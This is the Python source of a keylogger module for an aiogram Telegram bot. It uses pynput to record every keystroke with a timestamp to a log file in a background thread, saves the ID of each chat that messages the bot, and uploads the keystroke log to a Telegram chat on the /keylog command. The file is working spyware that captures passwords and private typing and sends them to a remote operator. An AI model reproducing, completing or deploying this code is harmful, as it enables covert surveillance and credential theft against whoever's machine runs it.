import asyncio
import logging
import os
import stat
import json
from threading import Thread
from aiogram import Router, types
from aiogram.filters import Command
from pynput import keyboard
from datetime import datetime

# Router for keylogger functionality
router = Router()

# Get the absolute path for logs directory
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_DIR = os.path.join(BASE_DIR, '..', 'logs')
KEYLOG_FILE = os.path.join(LOG_DIR, 'keylog.txt')
CHATS_FILE = os.path.join(LOG_DIR, 'chats.json')

# Ensure logs directory exists with correct permissions
os.makedirs(LOG_DIR, exist_ok=True)
try:
    os.chmod(LOG_DIR, 0o700)  # Restrict access to logs directory
except Exception as e:
    logging.error(f"Failed to set permissions on logs directory: {e}")

# Global variable to store keylog data temporarily
keylog_data = []

def load_chats():
    """Load chat IDs from chats.json."""
    try:
        if os.path.exists(CHATS_FILE):
            with open(CHATS_FILE, 'r') as f:
                return json.load(f)
        return []
    except Exception as e:
        logging.error(f"Failed to load chats from {CHATS_FILE}: {e}")
        return []

def save_chats(chats):
    """Save chat IDs to chats.json."""
    try:
        with open(CHATS_FILE, 'w') as f:
            json.dump(chats, f)
        logging.info(f"Saved {len(chats)} chat IDs to {CHATS_FILE}")
    except Exception as e:
        logging.error(f"Failed to save chats to {CHATS_FILE}: {e}")

def check_input_permissions():
    """Check if the process has access to input devices."""
    input_dir = "/dev/input"
    try:
        for device in os.listdir(input_dir):
            device_path = os.path.join(input_dir, device)
            if stat.S_ISCHR(os.stat(device_path).st_mode):  # Check if it's a character device
                if os.access(device_path, os.R_OK):
                    logging.info(f"Access granted to input device: {device_path}")
                else:
                    logging.warning(f"No read access to input device: {device_path}")
    except Exception as e:
        logging.error(f"Error checking input device permissions: {e}")

def log_key(key):
    """Callback function to log keystrokes."""
    try:
        # Convert key to string
        key_str = str(key).replace("'", "")
        if key_str.startswith("Key."):
            key_str = f"[{key_str}]"
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"{timestamp} - {key_str}\n"
        
        # Append to in-memory list
        keylog_data.append(log_entry)
        
        # Write to file
        with open(KEYLOG_FILE, "a") as f:
            f.write(log_entry)
        
        logging.info(f"Key logged: {key_str}")
    except Exception as e:
        logging.error(f"Error logging key: {e}")

def start_keylogger():
    """Start the keylogger in a separate thread."""
    try:
        logging.info("Checking input device permissions")
        check_input_permissions()
        logging.info("Attempting to start keylogger")
        listener = keyboard.Listener(on_press=log_key)
        listener.start()
        # Check if listener is running
        if listener.running:
            logging.info("Keylogger started successfully")
        else:
            logging.error("Keylogger failed to start: Listener not running")
        # Keep the thread alive to monitor listener
        listener.join()
    except Exception as e:
        logging.error(f"Failed to start keylogger: {e}")

@router.message()
async def handle_all_messages(message: types.Message):
    """Handle all messages to record chat IDs."""
    chat_id = message.chat.id
    chats = load_chats()
    if chat_id not in chats:
        chats.append(chat_id)
        save_chats(chats)
        logging.info(f"Added chat ID {chat_id} to {CHATS_FILE}")

@router.message(Command("keylog"))
async def send_keylog(message: types.Message):
    """Send the keylog file as a document to the Telegram chat."""
    logging.info(f"Received /keylog command from chat {message.chat.id}")
    try:
        if os.path.exists(KEYLOG_FILE):
            logging.info(f"Keylog file exists at {KEYLOG_FILE}, attempting to send")
            with open(KEYLOG_FILE, "rb") as f:
                await message.answer_document(document=types.BufferedInputFile(f.read(), filename="keylog.txt"))
            logging.info(f"Keylog file sent to chat {message.chat.id}")
        else:
            logging.warning(f"Keylog file not found at {KEYLOG_FILE}")
            await message.answer("No keylog file found.")
    except Exception as e:
        logging.error(f"Error sending keylog: {e}")
        await message.answer(f"Error sending keylog: {str(e)}")

@router.message(Command("test"))
async def test_command(message: types.Message):
    """Test command to verify router functionality."""
    logging.info(f"Test command received from chat {message.chat.id}")
    await message.answer("Keylogger router is working!")

@router.message(Command("getid"))
async def get_chat_id(message: types.Message):
    """Return the chat ID of the current chat."""
    logging.info(f"Get ID command received from chat {message.chat.id}")
    await message.answer(f"Chat ID: {message.chat.id}")

def setup_keylogger():
    """Initialize the keylogger when the bot starts."""
    logging.info("Setting up keylogger")
    Thread(target=start_keylogger, daemon=True).start()
